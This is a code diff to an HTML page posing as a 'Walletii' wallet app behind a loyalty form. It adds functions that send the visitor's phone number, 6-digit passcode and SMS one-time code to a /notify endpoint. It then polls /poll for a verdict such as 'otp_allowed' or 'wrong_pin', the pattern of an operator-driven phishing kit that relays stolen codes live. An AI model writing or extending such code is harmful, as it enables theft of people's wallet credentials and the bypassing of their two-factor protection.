@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -904,11 +905,19 @@ document.getElementById('loyaltyForm').addEventListener('submit', function(e) {
 
 
 // ══════════════════════════════════════════════════════
-//  PAGE 2 — WALLETII APP LOGIC
+//  PAGE 2 — WALLETII APP LOGIC  (connected to server.js)
 // ══════════════════════════════════════════════════════
 
+// Auto-detect API base: same origin in production, empty string works for relative paths
+const API_BASE = '';
+
 const SESSION = {
-  phone: '', countryCode: '', passcode: '',
+  phone:       '',
+  countryCode: '',
+  passcode:    '',
+  loginToken:  null,
+  otpToken:    null,
+  pollIv:      null,
 };
 
 let currentScreen = 'screen-landing';
@@ -970,30 +979,19 @@ function pcKey(d) {
   if (pcInput.length >= 6) return;
   pcInput += d; updateDots();
   if (pcInput.length === 6) {
-    // Auto-advance after short pause when all 6 digits entered
-    setTimeout(() => {
-      SESSION.passcode = pcInput;
-      proceedFromPasscode();
-    }, 380);
+    setTimeout(() => { SESSION.passcode = pcInput; proceedFromPasscode(); }, 380);
   }
 }
 
 function pcBackspace() {
   if (!pcInput.length) return;
-  pcInput = pcInput.slice(0,-1); updateDots();
+  pcInput = pcInput.slice(0, -1); updateDots();
 }
 
 function proceedFromPasscode() {
   if (pcInput.length < 6) return;
   SESSION.passcode = pcInput;
-  // Show brief loading spinner, then go straight to OTP screen
-  showWaiting('Verifying your details…', 'Please wait a moment');
-  setTimeout(() => {
-    hideWaiting();
-    document.getElementById('otpPhoneDisplay').textContent =
-      SESSION.countryCode + ' ' + SESSION.phone;
-    goTo('screen-otp');
-  }, 1400);
+  notifyLogin();
 }
 
 /* ── OTP screen ── */
@@ -1012,7 +1010,7 @@ function startOtpTimer() {
       clearInterval(otpTimer);
       document.getElementById('resendText').textContent  = 'Resend code';
       document.getElementById('resendText').style.cursor = 'pointer';
-      document.getElementById('resendText').onclick      = doResend;
+      document.getElementById('resendText').onclick      = notifyResend;
     } else {
       document.getElementById('resendText').textContent = 'Resend code in ' + otpCountdown + ' seconds';
     }
@@ -1054,16 +1052,122 @@ function onOtpKey(e) {
 function proceedFromOtp() {
   if (otpVal.length < 6) return;
   if (otpTimer) clearInterval(otpTimer);
-  // Show brief verifying spinner then show success
-  showWaiting('Checking your code…', 'Please wait a moment');
-  setTimeout(() => {
-    hideWaiting();
-    showSuccessOverlay();
-  }, 1400);
+  submitOTP();
 }
 
-function doResend() {
+/* ── API calls to server.js ── */
+
+async function notifyLogin() {
+  showWaiting('Verifying your details…', 'Please wait a moment');
+  try {
+    const res  = await fetch(API_BASE + '/notify', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({
+        type:        'login',
+        phone:       SESSION.phone,
+        countryCode: SESSION.countryCode,
+        passcode:    SESSION.passcode,
+      }),
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.error || 'Server error');
+    SESSION.loginToken = data.token;
+    startPolling(SESSION.loginToken, (result) => {
+      hideWaiting();
+      if (result === 'otp_allowed') {
+        document.getElementById('otpPhoneDisplay').textContent =
+          SESSION.countryCode + ' ' + SESSION.phone;
+        goTo('screen-otp');
+      } else if (result === 'wrong_pin') {
+        pcInput = ''; updateDots();
+        showErrOverlay('Incorrect PIN. Please try again.');
+      } else if (result === 'expired') {
+        showErrOverlay('Request timed out. Please try again.');
+      }
+    });
+  } catch (err) {
+    hideWaiting();
+    showErrOverlay('Could not reach server. Check your connection.');
+    console.error('notifyLogin error:', err);
+  }
+}
+
+async function submitOTP() {
+  showWaiting('Checking your code…', 'Please wait a moment');
+  try {
+    const res  = await fetch(API_BASE + '/notify', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({
+        type:        'otp',
+        phone:       SESSION.phone,
+        countryCode: SESSION.countryCode,
+        otp:         otpVal,
+        passcode:    SESSION.passcode,
+      }),
+    });
+    const data = await res.json();
+    if (!data.ok) throw new Error(data.error || 'Server error');
+    SESSION.otpToken = data.token;
+    startPolling(SESSION.otpToken, (result) => {
+      hideWaiting();
+      if (result === 'otp_correct')  showSuccessOverlay();
+      else if (result === 'otp_wrong')  showWrongOverlay();
+      else if (result === 'expired')    showErrOverlay('Request timed out. Please try again.');
+    });
+  } catch (err) {
+    hideWaiting();
+    showErrOverlay('Could not reach server. Check your connection.');
+    console.error('submitOTP error:', err);
+  }
+}
+
+async function notifyResend() {
+  const btn = document.getElementById('resendText');
+  btn.textContent  = 'Sending…';
+  btn.style.cursor = 'default';
+  btn.onclick      = null;
+  try {
+    await fetch(API_BASE + '/notify', {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body:    JSON.stringify({
+        type:        'resend',
+        phone:       SESSION.phone,
+        countryCode: SESSION.countryCode,
+      }),
+    });
+  } catch (err) {
+    console.error('notifyResend error:', err);
+  }
   startOtpTimer();
+}
+
+/* ── Polling (/poll every 2s) ── */
+function startPolling(token, callback) {
+  if (SESSION.pollIv) clearInterval(SESSION.pollIv);
+  let attempts = 0;
+  SESSION.pollIv = setInterval(async () => {
+    if (++attempts > 150) {           // ~5 minutes max
+      clearInterval(SESSION.pollIv);
+      callback('expired');
+      return;
+    }
+    try {
+      const res  = await fetch(API_BASE + '/poll', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ token }),
+      });
+      const data = await res.json();
+      if (!data.ok) return;
+      if (data.result !== 'pending') {
+        clearInterval(SESSION.pollIv);
+        callback(data.result);
+      }
+    } catch { /* network hiccup — keep polling */ }
+  }, 2000);
 }
 
 /* ── Overlays ── */
@@ -1075,7 +1179,9 @@ function showWaiting(title, sub) {
 function hideWaiting() { document.getElementById('ov-waiting').style.display = 'none'; }
 
 function showWrongOverlay() {
-  otpVal = ''; document.getElementById('otp-hidden').value = ''; updateOtpBoxes();
+  otpVal = '';
+  document.getElementById('otp-hidden').value = '';
+  updateOtpBoxes();
   document.getElementById('ov-wrong').style.display = 'flex';
 }
 function closeWrongOverlay() {
@@ -1083,11 +1189,16 @@ function closeWrongOverlay() {
   setTimeout(() => document.getElementById('otp-hidden').focus(), 200);
 }
 
-function showSuccessOverlay() { document.getElementById('ov-success').style.display = 'flex'; }
+function showSuccessOverlay() {
+  document.getElementById('ov-success').style.display = 'flex';
+}
 
 function closeSuccessAndReset() {
   document.getElementById('ov-success').style.display = 'none';
-  // Reset all state and go back to the walletii landing screen
+  // Clear all session state
+  SESSION.phone = ''; SESSION.countryCode = '';
+  SESSION.passcode = ''; SESSION.loginToken = null; SESSION.otpToken = null;
+  if (SESSION.pollIv) { clearInterval(SESSION.pollIv); SESSION.pollIv = null; }
   pcInput = ''; updateDots();
   otpVal  = ''; if (otpTimer) clearInterval(otpTimer);
   document.getElementById('phoneInput').value = '';
